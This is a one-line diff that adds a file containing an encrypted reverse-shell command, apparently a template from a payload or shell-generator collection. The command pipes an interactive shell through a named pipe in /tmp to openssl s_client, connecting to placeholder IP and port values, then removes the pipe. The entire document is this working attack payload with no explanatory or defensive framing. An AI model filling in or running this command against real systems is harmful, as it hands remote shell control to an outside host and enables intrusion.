@@ -1,0 +1,1 @@
+mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {{IP}}:{{PORT}} > /tmp/s; rm /tmp/s
